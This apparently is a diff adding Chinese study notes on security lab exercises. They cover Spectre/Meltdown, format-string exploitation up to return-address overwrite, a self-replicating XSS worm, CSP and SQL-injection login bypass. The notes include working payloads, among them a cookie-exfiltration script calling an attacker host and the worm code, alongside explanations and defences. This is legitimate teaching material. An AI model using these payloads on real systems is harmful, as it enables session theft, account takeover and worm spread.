+<tr><th style="width:30%">改动</th><th style="width:22%">现象</th><th style="width:48%">原因（答辩必答）</th></tr>
+<tr><td>注释掉 <code>_mm_clflush(&amp;size)</code></td><td>成功率<b>断崖式下降</b></td><td>size 还在 cache 里，CPU 读取它只要几十周期，<b>来得及算完再判断</b>，根本不需要投机执行</td></tr>
+<tr><td>把 <code>victim(i)</code> 改成 <code>victim(i+20)</code></td><td>完全失败</td><td>训练的是「数组下标总比 size 大」这个方向，于是 CPU 预测的正是「越界」，而越界结果<b>本来就不需要被丢弃</b>——没有投机窗口可钻</td></tr>
+<tr><td>不改 <code>max</code> 的初值</td><td>最高分总是 0</td><td><code>restrictedAccess</code> 返回 0 时执行了 <code>array[0*4096+DELTA] += 88</code>，第 0 页被缓存，抢占最高分；所以 <code>max</code> 与循环都从 1 开始</td></tr>
+</table>
+<p class="small">另外两个细节：<code>printf("*****")</code> 看起来无用，实际是给投机执行留出时间窗口，删掉就失败；<code>usleep</code> 取 10 / 100 / 1000 都能 10/10 成功。逐字节读 17 次（<code>index_beyond++</code>）就把整个 secret 字符串读出来了。</p>
+
+<h3>3.3 Meltdown：不等预测，直接抢在异常之前</h3>
+<p>Meltdown 更暴力：<b>直接读内核地址</b>。访问会产生异常（#PF），但 CPU 是流水线的，<b>异常被处理之前</b>，后面依赖这条数据的指令（<code>array[k*4096]</code>）已经乱序执行、把页拉进了 cache。只要用 <code>setjmp/longjmp</code> 捕获 SIGSEGV 恢复现场，再 reload 就能读出内核内存。</p>
+<div class="fig">
+<svg viewBox="0 0 720 170" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="11.5">
+  <defs><marker id="a6" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#333"/></marker></defs>
+  <line x1="30" y1="45" x2="690" y2="45" stroke="#333" stroke-width="1.2" marker-end="url(#a6)"/>
+  <text x="700" y="49" font-size="10" fill="#666">时间</text>
+
+  <rect x="30" y="60" width="180" height="58" rx="4" fill="#ffd9d9" stroke="#b00020"/>
+  <text x="120" y="82" text-anchor="middle" font-size="11">char c = *kernel_addr;</text>
+  <text x="120" y="100" text-anchor="middle" font-size="10.5" fill="#b00020">非法访问，将产生 #PF</text>
+
+  <rect x="230" y="60" width="200" height="58" rx="4" fill="#fff3cd" stroke="#8a6d00"/>
+  <text x="330" y="82" text-anchor="middle" font-size="11">array[c*4096] 被乱序执行</text>
+  <text x="330" y="100" text-anchor="middle" font-size="10.5" fill="#8a6d00">异常尚未提交 → 已进 cache</text>
+
+  <rect x="450" y="60" width="180" height="58" rx="4" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="540" y="82" text-anchor="middle" font-size="11">setjmp/longjmp</text>
+  <text x="540" y="100" text-anchor="middle" font-size="10.5" fill="#1d4ed8">捕获 SIGSEGV 并恢复</text>
+
+  <rect x="650" y="60" width="70" height="58" rx="4" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="685" y="82" text-anchor="middle" font-size="11">reload</text>
+  <text x="685" y="100" text-anchor="middle" font-size="9.5" fill="#2e7d32">读出 c</text>
+
+  <line x1="210" y1="89" x2="226" y2="89" stroke="#333" stroke-width="1.3" marker-end="url(#a6)"/>
+  <line x1="430" y1="89" x2="446" y2="89" stroke="#333" stroke-width="1.3" marker-end="url(#a6)"/>
+  <line x1="630" y1="89" x2="646" y2="89" stroke="#333" stroke-width="1.3" marker-end="url(#a6)"/>
+  <text x="30" y="148" font-size="10.5" fill="#555">实验直接解引用内核地址 0x00000000715ffb05 会崩；改用 setjmp 后程序能继续跑，且 <tspan font-family="Consolas">array[7*4096+1024] is in cache</tspan>。</text>
+</svg>
+<div class="cap">图 6　Meltdown：异常发生之前，数据已经被「偷」进了 cache</div>
+</div>
+
+<h3>3.4 两者的共同点、不同点（小测原题）</h3>
+<div class="quiz">
+<p><b>共同点</b>：都利用了 CPU 的<span class="red">乱序执行 / 投机执行</span>，都用<span class="red">侧信道（Flush+Reload）</span>把「乱序执行留下的 cache 痕迹」翻译成数据；本质都是「<b>算过了但假装没算</b>」。</p>
+<p><b>不同点</b>：<br>
+① <b>攻击对象</b>：Meltdown 读<b>内核 / 其它进程</b>的内存（跨权限边界）；Spectre 读<b>同进程、沙盒内</b>的数据（越界）。<br>
+② <b>是否需训练</b>：Meltdown <b>不需要</b>训练，靠的是「异常检查晚于数据读取」这个硬件缺陷；Spectre <b>必须多轮训练</b>分支预测器，让它相信条件成立。<br>
+③ <b>依赖的缺陷</b>：Meltdown 是权限检查与数据读取的时序漏洞；Spectre 是分支预测 + 越界检查的时序漏洞。</p>
+<p><b>防御</b>：KPTI/KAISER（内核页表在用户态不可见，Meltdown 失效）、<code>lfence</code> 等序列化指令（切断投机）、编译器插入防护、微码/硬件修复（IBRS/IBPB）。</p>
+</div>
+
+<h2>4　格式化字符串：把数据当成指令用</h2>
+
+<h3>4.1 原理：<code>%x</code> 从哪拿参数、<code>%n</code> 往哪写</h3>
+<p><code>printf(fmt, …)</code> 是<b>变参函数</b>：它靠格式串里的 <code>%</code> 决定「去参数区的第几个槽位取数据、按什么类型解释」。如果 <code>fmt</code> 是用户输入，攻击者就能<b>自己指定</b>去读/写哪个槽位。</p>
+<ul>
+<li><code>%x</code>：把槽位内容按十六进制打出来 → <b>泄漏</b>；</li>
+<li><code>%s</code>：把槽位内容<b>当地址</b>，打印该地址处的字符串 → <b>任意地址读</b>（地址非法则崩溃）；</li>
+<li><code>%n</code>：把「到目前为止已输出的字符数」<b>写进</b>槽位指向的地址 → <b>任意地址写</b>；<code>%hn</code> 写 2 字节，<code>%hhn</code> 写 1 字节。</li>
+</ul>
+<p><b>参数区在哪</b>：32 位全部在栈上；64 位前 6 个在寄存器 <code>rdi, rsi, rdx, rcx, r8, r9</code>，第 7 个起才在栈上。这就是为什么 32 位用几十个 <code>%x</code>、64 位用 <code>%p</code> 也要数到 159 个才能摸到自己的 buffer。</p>
+
+<div class="fig">
+<svg viewBox="0 0 720 240" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="11">
+  <defs><marker id="a7" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#b00020"/></marker></defs>
+  <text x="20" y="24" font-size="11" font-weight="700">printf 的参数区（越往后 = 栈上越高的位置）</text>
+
+  <rect x="20" y="36" width="60" height="34" fill="#e8f5e9" stroke="#2e7d32"/><text x="50" y="58" text-anchor="middle" font-size="10">%1</text>
+  <rect x="84" y="36" width="60" height="34" fill="#e8f5e9" stroke="#2e7d32"/><text x="114" y="58" text-anchor="middle" font-size="10">%2</text>
+  <rect x="148" y="36" width="60" height="34" fill="#e8f5e9" stroke="#2e7d32"/><text x="178" y="58" text-anchor="middle" font-size="10">%3</text>
+  <rect x="212" y="36" width="60" height="34" fill="#e8f5e9" stroke="#2e7d32"/><text x="242" y="58" text-anchor="middle" font-size="10">%4</text>
+  <rect x="276" y="36" width="60" height="34" fill="#e8f5e9" stroke="#2e7d32"/><text x="306" y="58" text-anchor="middle" font-size="10">%5</text>
+  <rect x="340" y="36" width="60" height="34" fill="#e8f5e9" stroke="#2e7d32"/><text x="370" y="58" text-anchor="middle" font-size="10">%6</text>
+  <text x="404" y="58" font-size="11" fill="#666">……</text>
+
+  <rect x="452" y="36" width="90" height="34" fill="#ffd9d9" stroke="#b00020" stroke-width="2"/>
+  <text x="497" y="52" text-anchor="middle" font-size="10" fill="#b00020">%64</text>
+  <text x="497" y="65" text-anchor="middle" font-size="8.5" fill="#b00020">= buffer 开头</text>
+  <text x="552" y="58" font-size="10.5" fill="#b00020">← 32 位实测第 64 个</text>
+
+  <text x="20" y="92" font-size="10.5" fill="#555">（64 位时 %1~%6 在寄存器里，%7 起在栈上；用 %p 一个个数，本实验数到 159）</text>
+
+  <rect x="20" y="108" width="420" height="52" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="30" y="126" font-size="10.5" fill="#1d4ed8">buffer 的前 8 个字节（攻击者自己填）</text>
+  <text x="30" y="146" font-size="11" font-family="Consolas">08 40 0b 08 | 00 00 00 00</text>
+  <text x="450" y="130" font-size="10.5">← 小端写 0x080b4008（秘密数据的地址）</text>
+  <text x="450" y="148" font-size="10.5">于是 %64$s 就会把该地址的内容打出来</text>
+
+  <path d="M497,74 L497,96 L300,96" stroke="#b00020" stroke-width="1.2" fill="none" marker-end="url(#a7)"/>
+  <path d="M120,160 L120,190 L497,190 L497,74" stroke="#b00020" stroke-width="1.2" fill="none" stroke-dasharray="4 3"/>
+  <text x="150" y="184" font-size="10.5" fill="#b00020">把地址放在 buffer 开头 → 第 64 个槽位正好指向它</text>
+</svg>
+<div class="cap">图 7　「第 64 个参数」为什么正好是 buffer：地址放在 buffer 开头，再用 <code>%64$s</code> 解引用</div>
+</div>
+
+<pre># ① 找偏移：发 64 个 %x，看 0xbfffeeee 第几个出现 → 第 64 个
+# ② 任意读：把 0x080b4008 写到 buffer 开头，第 64 个 %x 换成 %s
+python3 -c 'print("%x"*63 + "%s", end="")' | nc 10.9.0.5 9090</pre>
+
+<h3>4.2 任意写：为什么要把 4 个字节拆成 4 次 <code>%hhn</code></h3>
+<p>要往 <code>0x080e5068</code> 写一个值，直觉做法是用 <code>%n</code> 一次写完；但 <code>%n</code> 写的是<b>「已输出字符数」</b>，一个 4 字节的数可能高达上亿——意味着程序要先输出上亿个字符，不现实，也常常不允许。</p>
+<p>所以拆成 4 个字节：把目标地址 +0/+1/+2/+3 四个地址<b>分别</b>排进 buffer（本实验放在 1000 / 1008 / 1016 / 1024），然后用 <code>%hhn</code> 一次写 1 字节，<b>按数值从小到大</b>排好顺序，相邻两次之间用 <code>%&lt;差值&gt;d</code> 补齐字符数。</p>
+
+<div class="fig">
+<svg viewBox="0 0 720 250" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="10.5">
+  <defs><marker id="a8" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#333"/></marker></defs>
+  <text x="20" y="22" font-weight="700" font-size="11">目标变量 0x080e5068 的 4 个字节</text>
+  <rect x="330" y="32" width="46" height="32" fill="#f0f0f0" stroke="#333"/><text x="353" y="53" text-anchor="middle">68</text>
+  <rect x="376" y="32" width="46" height="32" fill="#f0f0f0" stroke="#333"/><text x="399" y="53" text-anchor="middle">69</text>
+  <rect x="422" y="32" width="46" height="32" fill="#f0f0f0" stroke="#333"/><text x="445" y="53" text-anchor="middle">6a</text>
+  <rect x="468" y="32" width="46" height="32" fill="#f0f0f0" stroke="#333"/><text x="491" y="53" text-anchor="middle">6b</text>
+  <text x="524" y="53" font-size="10">← 地址低 → 高</text>
+
+  <text x="20" y="96" font-weight="700" font-size="11">buffer 里的 4 个地址（各占 8 字节对齐）</text>
+  <rect x="120" y="106" width="90" height="34" fill="#dbe9ff" stroke="#1d4ed8"/><text x="165" y="121" text-anchor="middle" font-size="10">@1000</text><text x="165" y="134" text-anchor="middle" font-size="9">0x080e506b</text>
+  <rect x="230" y="106" width="90" height="34" fill="#dbe9ff" stroke="#1d4ed8"/><text x="275" y="121" text-anchor="middle" font-size="10">@1008</text><text x="275" y="134" text-anchor="middle" font-size="9">0x080e506a</text>
+  <rect x="340" y="106" width="90" height="34" fill="#dbe9ff" stroke="#1d4ed8"/><text x="385" y="121" text-anchor="middle" font-size="10">@1016</text><text x="385" y="134" text-anchor="middle" font-size="9">0x080e5069</text>
+  <rect x="450" y="106" width="90" height="34" fill="#dbe9ff" stroke="#1d4ed8"/><text x="495" y="121" text-anchor="middle" font-size="10">@1024</text><text x="495" y="134" text-anchor="middle" font-size="9">0x080e5068</text>
+
+  <line x1="165" y1="106" x2="490" y2="64" stroke="#b00020" stroke-width="1.2" marker-end="url(#a8)"/>
+  <line x1="495" y1="106" x2="355" y2="64" stroke="#b00020" stroke-width="1.2" marker-end="url(#a8)"/>
+  <text x="150" y="158" font-size="9.5" fill="#b00020">先写最高字节 6b（@1000 指向它），再依次往下写</text>
+
+  <text x="20" y="178" font-weight="700" font-size="11">格式串（输出字符数依次累加）</text>
+  <text x="20" y="200" font-size="10.5" font-family="Consolas">"%x"*312  +  "%326d"+"%hhn"  +  "%273d"+"%hhn"  +  "%273d"+"%hhn"  +  "%273d"+"%hhn"</text>
+  <text x="20" y="220" font-size="9.8" fill="#555">前 312 个 %x 负责把参数游标推到 buffer[1000] 处；每个 "%Nd" 把累计输出补齐到目标字节值（不够就 +256 绕圈）。</text>
+  <text x="20" y="238" font-size="9.8" fill="#b00020">顺序必须是「高地址字节 → 低地址字节」，这样累计计数只会增大，不会倒退。</text>
+</svg>
+<div class="cap">图 8　拆字节写内存：4 个地址 → 4 次 <code>%hhn</code>，按高字节到低字节、计数单调递增</div>
+</div>
+
+<p><span class="key">为什么地址放在 1000 而不是开头？</span>因为 buffer 一共 1500 字节，格式串本身要占前 1000 字节左右（几十个 <code>%x</code> 就是几百字符），把地址放在 1000 之后既不会被格式串覆盖，又保证「第 64 个参数」正好落在地址区。</p>
+
+<h3>4.3 升级：覆盖返回地址，跳到自己写的 shellcode</h3>
+<p>把目标从「一个变量」换成「<code>myprintf</code> 的返回地址」，思路完全一样，只是地址变了：</p>
+<ul>
+<li><b>32 位</b>：<code>myprintf</code> 的返回地址在 <code>ebp+4 = 0xffffd37c</code>，buf 起始 <code>0xffffd450</code>；shellcode 放在 <code>buf+1200 = 0xffffd900</code>；把 <code>0xffffd37f/7e/7d/7c</code> 四个地址写到 1000 起，用 4 个 <code>%hhn</code> 逐字节写返回地址。</li>
+<li><b>64 位</b>：先用 <code>%p</code> 数到 <b>159 个</b>摸到 buffer；返回地址存在 <code>rsp+8</code>，它的值是 <code>0x7fffffffe380</code>，shellcode 放 <code>+1200 = 0x7fffffffe830</code>；返回地址有 8 字节，但高两字节本来就是 0，所以用 <b>6 个 <code>%hhn</code></b> 就够。</li>
+</ul>
+<pre>// 64 位：159-2 个 %p 用来推游标，后面 6 次 %lld + %hhn 逐字节写 8 字节返回地址
+s = "%p"*(159-2) + "%174lld"+"%hhn" + "%128lld"+"%hhn" + "%256lld"+"%hhn" \
+  + "%256lld"+"%hhn" + "%233lld"+"%hhn" + "%72lld"+"%hhn"</pre>
+
+<h3>4.4 小测：两个候选返回地址，一次输入都要命中</h3>
+<div class="quiz">
+<p><b>题目</b>：栈上有 A1、A2 两个可能被用作返回地址的位置，但<b>不知道程序这次用哪个</b>；要求「构造一次即可成功的完整输入」；必须写出完整格式串与<b>每一步累计输出字符数</b>；至少用一次 <code>%hn</code>、一次 <code>%hhn</code>；<b>禁止用 <code>%n</code></b>；恶意代码只需标注「恶意代码（40 字节）」。</p>
+<p><b>思路</b>：既然不知道用哪个，就让<b>两个位置都变成同一个跳转地址</b>。<br>
+① 先把 A1、A2 两个地址都排进 payload；② 用 <code>B − C = 0x40</code>（相差 64 字节 = 16 个参数位）算出 B 处地址区对应的参数序号；③ 对 A1 的 4 个字节依次 <code>%hhn</code>，再对 A2 的 4 个字节再写一遍（同值，所以差值相同，必要时 +256 绕圈）；④ 最后跳转地址指向 payload 里标注的「恶意代码（40 字节）」。</p>
+<p><b>易错点</b>：题目禁止 <code>%n</code>，只能 <code>%hn</code>/<code>%hhn</code>；每写一个字节都要在答案里写出「此刻累计输出了多少字符」，这是本题的给分点。</p>
+</div>
+
+<h3>4.5 防御</h3>
+<p>一句话：<b>永远不要让用户数据出现在格式串的位置</b>。<code>printf(msg)</code> → <code>printf("%s", msg)</code>；同理 <code>syslog(msg)</code> → <code>syslog("%s", msg)</code>。修复后程序不再崩，攻击也完全不生效。编译器的 <code>-Wformat-security</code> 能帮忙发现这类写法。</p>
+
+<h2>5　XSS：让受害者的浏览器替我发请求</h2>
+
+<h3>5.1 原理与分类</h3>
+<div class="def">
+<b>XSS（跨站脚本）</b>：应用把用户输入<b>未经转义</b>地写进 HTML 页面，浏览器把这段数据当成 <b>JavaScript 代码</b>执行，于是攻击者的脚本<b>以受害者的身份、在受害者的会话里</b>运行。它不是「攻击服务器」，而是「借用受害者的浏览器和 cookie」。
+</div>
+<table>
+<tr><th style="width:16%">类型</th><th style="width:42%">恶意数据存在哪</th><th style="width:42%">触发方式</th></tr>
+<tr><td>存储型（本实验）</td><td>存进数据库（profile 的 Brief description）</td><td>任何用户打开该页面都会执行——所以能做成蠕虫</td></tr>
+<tr><td>反射型</td><td>在 URL 参数里，服务器原样回显</td><td>诱导受害者点一个构造好的链接</td></tr>
+<tr><td>DOM 型</td><td>不出服务器，前端 JS 直接把输入塞进 <code>innerHTML</code></td><td>页面脚本自己处理不当</td></tr>
+</table>
+<p>Elgg 是个社交网站，攻击目标就是复刻 2005 年的 <b>Samy 蠕虫</b>：受害者一旦看了攻击者的主页，就（1）自动加攻击者为好友、（2）把自己的主页也变成蠕虫的副本，（3）继续传染下一个人。</p>
+
+<div class="fig">
+<svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="11">
+  <defs><marker id="a9" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#333"/></marker></defs>
+
+  <rect x="10" y="20" width="200" height="56" rx="5" fill="#fff3cd" stroke="#8a6d00"/>
+  <text x="110" y="42" text-anchor="middle" font-weight="700" font-size="11">① Samy 的 profile</text>
+  <text x="110" y="60" text-anchor="middle" font-size="10.5">Brief description 里塞 &lt;script&gt;</text>
+
+  <rect x="250" y="20" width="200" height="56" rx="5" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="350" y="42" text-anchor="middle" font-weight="700" font-size="11">② Boby 打开他的主页</text>
+  <text x="350" y="60" text-anchor="middle" font-size="10.5">服务器把恶意串当正文返回</text>
+
+  <rect x="490" y="20" width="215" height="56" rx="5" fill="#ffd9d9" stroke="#b00020"/>
+  <text x="597" y="42" text-anchor="middle" font-weight="700" font-size="11">③ Boby 的浏览器执行脚本</text>
+  <text x="597" y="60" text-anchor="middle" font-size="10.5">（数据变成了代码）</text>
+
+  <line x1="210" y1="48" x2="246" y2="48" stroke="#333" stroke-width="1.4" marker-end="url(#a9)"/>
+  <line x1="450" y1="48" x2="486" y2="48" stroke="#333" stroke-width="1.4" marker-end="url(#a9)"/>
+
+  <rect x="490" y="110" width="215" height="56" rx="5" fill="#f4f4f4" stroke="#888"/>
+  <text x="597" y="132" text-anchor="middle" font-size="10.5">脚本读同源变量：</text>
+  <text x="597" y="150" text-anchor="middle" font-size="10" font-family="Consolas">elgg.security.token.__elgg_ts/_token</text>
+
+  <line x1="597" y1="76" x2="597" y2="106" stroke="#333" stroke-width="1.4" marker-end="url(#a9)"/>
+
+  <rect x="250" y="110" width="200" height="56" rx="5" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="350" y="132" text-anchor="middle" font-weight="700" font-size="11">④ 用 XHR 发请求</text>
+  <text x="350" y="150" text-anchor="middle" font-size="10.5">GET 加好友 / POST 改资料</text>
+
+  <line x1="486" y1="138" x2="454" y2="138" stroke="#333" stroke-width="1.4" marker-end="url(#a9)"/>
+
+  <rect x="10" y="110" width="200" height="56" rx="5" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="110" y="132" text-anchor="middle" font-weight="700" font-size="11">⑤ 服务器校验 token</text>
+  <text x="110" y="150" text-anchor="middle" font-size="10.5">token 合法 → 请求被接受</text>
+
+  <line x1="246" y1="138" x2="214" y2="138" stroke="#333" stroke-width="1.4" marker-end="url(#a9)"/>
+
+  <rect x="10" y="200" width="440" height="58" rx="5" fill="#fff8e1" stroke="#d69e00"/>
+  <text x="24" y="220" font-size="10.5"><tspan font-weight="700">⑥ 蠕虫复制自己</tspan>：脚本用 document.getElementById("worm").innerHTML 取到</text>
+  <text x="24" y="238" font-size="10.5">自己的完整代码 → encodeURIComponent → 写进 Boby 的 description。</text>
+  <text x="24" y="252" font-size="10" fill="#8a6d00">Boby 的页面从此也带着蠕虫，传染链继续。</text>
+
+  <line x1="350" y1="166" x2="300" y2="196" stroke="#333" stroke-width="1.3" marker-end="url(#a9)"/>
+
+  <rect x="470" y="200" width="235" height="58" rx="5" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="484" y="220" font-size="10.5"><tspan font-weight="700">关键前提：同源</tspan></text>
+  <text x="484" y="238" font-size="10.5">脚本是从 seed-server.com 的</text>
+  <text x="484" y="252" font-size="10.5">页面注入的，所以能读该源的 token。</text>
+</svg>
+<div class="cap">图 9　XSS 攻击链：注入 → 执行 → 读 token → 伪造请求 → 自我复制</div>
+</div>
+
+<h3>5.2 第 1–3 关：从弹窗到偷 cookie</h3>
+<pre>&lt;script&gt;alert('XSS');&lt;/script&gt;                                  # ① 证明能执行
+&lt;script&gt;alert(document.cookie);&lt;/script&gt;                        # ② 看到会话 cookie
+&lt;script&gt;document.write('&lt;img src=http://10.9.0.1:5555?c='
+  + escape(document.cookie) + ' &gt;');&lt;/script&gt;                   # ③ 外带
+# 攻击机上： nc -l 5555      ← 用 <img src> 是为了「静默」发请求（不会被弹窗打断）
+</pre>
+<p>为什么用 <code>&lt;img src=…&gt;</code> 而不是 <code>fetch</code>：图片请求不受同源策略限制，也不需要在页面上留痕迹，是最经典的 cookie 外带手法。</p>
+
+<h3>5.3 第 4 关：加好友——为什么必须带 CSRF token</h3>
+<p>Elgg 每个「会改状态」的请求都要带两个值：<code>__elgg_ts</code>（时间戳）与 <code>__elgg_token</code>（会话令牌）。这是 <b>CSRF 防护</b>：防止别的站点伪造请求。但我们的脚本是在<b>目标站点自己的页面里</b>运行的（同源），于是它可以直接读到这两个值，构造出一个<b>完全合法</b>的请求。</p>
+<pre>&lt;script type="text/javascript"&gt;
+window.onload = function () {
+  var ts    = "&amp;__elgg_ts="    + elgg.security.token.__elgg_ts;
+  var token = "&amp;__elgg_token=" + elgg.security.token.__elgg_token;
+  var url   = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
+  var x = new XMLHttpRequest();
+  x.open("GET", url, true); x.send();
+};
+&lt;/script&gt;</pre>
+<div class="quiz">
+<p><b>Q：为什么要取 <code>__elgg_ts</code> 和 <code>__elgg_token</code>？</b><br>
+绕过服务器的 CSRF 防护。没有这两个值，伪造的 AJAX 请求会被服务器判为伪造而拒绝；有了它们，请求在服务器看来就是「当前登录用户本人发起的」。</p>
+<p><b>Q：如果把同样的脚本写进 "About me" 文本框，能成功吗？</b><br>
+不能。该字段会被过滤/转义（按 HTML 文本渲染），<code>&lt;script&gt;</code> 只作为<b>文字</b>显示而不会执行——<b>能不能注入，取决于输出时有没有转义</b>。</p>
+</div>
+
+<h3>5.4 第 5 关：改资料——为什么要跳过自己</h3>
+<pre>var content = ts + token
+  + "&amp;guid=" + elgg.session.user.guid          // 受害者自己的 ID
+  + "&amp;name=" + elgg.session.user.name
+  + "&amp;description=Modified HAHA&amp;accesslevel[description]=2";
+if (elgg.session.user.guid != 59) {            // 59 是 Samy 自己
+  var x = new XMLHttpRequest();
+  x.open("POST", "http://www.seed-server.com/action/profile/edit", true);
+  x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  x.send(content);
+}</pre>
+<div class="quiz">
+<p><b>Q：为什么加 <code>if (elgg.session.user.guid != 59)</code>？</b><br>
+防止 Samy 打开自己的主页时，脚本把他自己的 profile 也改成 "Modified HAHA"，<b>覆盖掉原来的蠕虫代码</b>，导致传播链断掉。</p>
+</div>
+
+<h3>5.5 第 6 关：自复制蠕虫</h3>
+<pre>var header = "&lt;script id=\"worm\" type=\"text/javascript\"&gt;";
+var jsCode = document.getElementById("worm").innerHTML;  // 取到自己的代码
+var tail   = "&lt;/" + "script&gt;";                           // 拆开写，避免被解析器提前闭合
+var wormCode = encodeURIComponent(header + jsCode + tail); // URL 编码后放进表单
+// ① 写进受害者的 description（植入副本）  ② 再发一次加好友请求（建立传播边）</pre>
+<p>三个细节：用 <b>id="worm"</b> 定位自己；用 <code>"&lt;/" + "script&gt;"</b> 拼接尾部（否则浏览器的 HTML 解析器会在代码里就把 <code>&lt;/script&gt;</code> 当成结束标签）；用 <b>encodeURIComponent</b> 保证放进表单时特殊字符不破坏请求。</p>
+
+<h3>5.6 第 7 关：CSP 逐条解释（小测给分点）</h3>
+<table>
+<tr><th style="width:22%">策略</th><th style="width:38%">实验现象</th><th style="width:40%">原因</th></tr>
+<tr><td><b>32a</b> 无 CSP 头</td><td>6 段脚本<b>全部</b>执行</td><td>浏览器不做任何来源限制</td></tr>
+<tr><td><b>32b</b><br><code>script-src 'self' *.example70.com</code></td><td>内联 1/2/3 全失败；同源外部 <code>script_area4.js</code> 通过；<code>example60</code> 失败</td><td>没有 <code>'unsafe-inline'</code>，也没有 nonce/hash → <b>所有内联脚本一律拒绝</b>；外部脚本只认白名单</td></tr>
+<tr><td><b>32c</b> 再加 <code>'nonce-111-111-111'</code></td><td>只有 nonce 为 <code>111-111-111</code> 的那个执行</td><td>nonce 是<b>逐个比对</b>的，不是「有 nonce 就放行」</td></tr>
+<tr><td><code>onclick="alert(...)"</code> 按钮</td><td>32a 弹窗，32b/32c 无反应</td><td><b>属性形式的内联事件处理器也属于内联脚本</b>，同样受 <code>script-src</code> 管</td></tr>
+</table>
+<pre># Apache 里加响应头
+Header set Content-Security-Policy "default-src 'self'; \
+  script-src 'self' 'nonce-111-111-111' *.example60.com *.example70.com"
+# 或者 PHP 动态下发
+$cspheader = "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-111-111-111'";
+header($cspheader);</pre>
+<p><b>CSP 为什么能防 XSS</b>：它让服务器明确声明「哪些来源的脚本可信」，并且<b>默认拒绝内联</b>——注入的 <code>&lt;script&gt;</code>、<code>onclick=</code>、<code>javascript:</code> 只要不在白名单或没有正确 nonce，就根本不会执行。这才是从根因（数据被当代码）上解决，而不仅是被动转义。</p>
+
+<h2>6　SQL 注入：让数据库把我的输入当成语句</h2>
+
+<h3>6.1 原理：字符串拼接把「数据」升级成了「语法」</h3>
+<p>程序这样拼 SQL：<code>"SELECT … FROM credential WHERE name= '$uname' and Password='$pwd'"</code>。正常输入时，<code>$uname</code> 落在<b>两个引号之间</b>，数据库只把它当字符串。可一旦输入里带一个单引号 <code>'</code>，这个<b>引号就闭合了字符串</b>，后面的内容就不再是数据，而是 SQL 语句的一部分。</p>
+
+<div class="fig">
+<svg viewBox="0 0 720 250" xmlns="http://www.w3.org/2000/svg" font-family="Consolas" font-size="11">
+  <text x="10" y="24" font-family="Microsoft YaHei" font-size="11" font-weight="700">正常输入 username = alice</text>
+  <rect x="10" y="34" width="120" height="30" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="70" y="54" text-anchor="middle" font-size="10.5">WHERE name= '</text>
+  <rect x="130" y="34" width="120" height="30" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="190" y="54" text-anchor="middle" font-size="10.5">alice</text>
+  <rect x="250" y="34" width="330" height="30" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="415" y="54" text-anchor="middle" font-size="10.5">' and Password='&lt;hash&gt;'</text>
+  <text x="590" y="54" fill="#2e7d32" font-family="Microsoft YaHei" font-size="10.5">← 全是代码，alice 是数据</text>
+
+  <text x="10" y="104" font-family="Microsoft YaHei" font-size="11" font-weight="700">注入输入 username = admin'#</text>
+  <rect x="10" y="114" width="120" height="30" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="70" y="134" text-anchor="middle" font-size="10.5">WHERE name= '</text>
+  <rect x="130" y="114" width="90" height="30" fill="#ffd9d9" stroke="#b00020" stroke-width="2"/>
+  <text x="175" y="134" text-anchor="middle" font-size="10.5" fill="#b00020">admin'</text>
+  <rect x="220" y="114" width="80" height="30" fill="#ffd9d9" stroke="#b00020" stroke-width="2"/>
+  <text x="260" y="134" text-anchor="middle" font-size="12" fill="#b00020" font-weight="700">#</text>
+  <rect x="300" y="114" width="290" height="30" fill="#eeeeee" stroke="#999" stroke-dasharray="4 3"/>
+  <text x="445" y="134" text-anchor="middle" font-size="10.5" fill="#888">' and Password='&lt;hash&gt;'</text>
+  <text x="600" y="134" font-family="Microsoft YaHei" font-size="10.5" fill="#b00020">← 被 # 注释掉</text>
+
+  <line x1="175" y1="146" x2="175" y2="170" stroke="#b00020" stroke-width="1.2"/>
+  <text x="10" y="186" font-family="Microsoft YaHei" font-size="10.5" fill="#b00020">① 这个单引号闭合了字符串 → 「admin」之外的部分不再是数据</text>
+  <text x="10" y="206" font-family="Microsoft YaHei" font-size="10.5" fill="#b00020">② <tspan font-family="Consolas">#</tspan> 把后面的密码判断整段变成注释 → 密码条件消失 → 任意密码都能登录</text>
+  <text x="10" y="232" font-family="Microsoft YaHei" font-size="10.5" fill="#555">本质：SQL 解析器看到的「代码/数据边界」和程序员以为的不一样。</text>
+</svg>
+<div class="cap">图 10　一个单引号 + 一个注释符，就把密码条件变成了注释</div>
+</div>
+
+<h3>6.2 登录绕过（SELECT 注入）</h3>
+<p>用户名填 <code>admin'#</code>，密码随便。拼接结果：</p>
+<pre>SELECT ... FROM credential WHERE name= 'admin'#' and Password='<span style="color:#b00020">任意值</span>'</pre>
+<p>命令行等价写法（注意 URL 编码：<code>%27</code> = <code>'</code>，<code>%23</code> = <code>#</code>，<code>%20</code> = 空格）：</p>
+<pre>curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20%23&amp;Password=123'</pre>
+<p><b>为什么 2.3 的「附加第二条语句」不成功</b>：PHP 的 <code>mysqli::query()</code> <b>不支持一次执行多条语句</b>（只有 <code>mysqli_multi_query()</code> 才会），所以用 <code>;</code> 拼 <code>UPDATE</code>/<code>DELETE</code> 会被拒绝——这是「防范措施」而不是「语法问题」。</p>
+
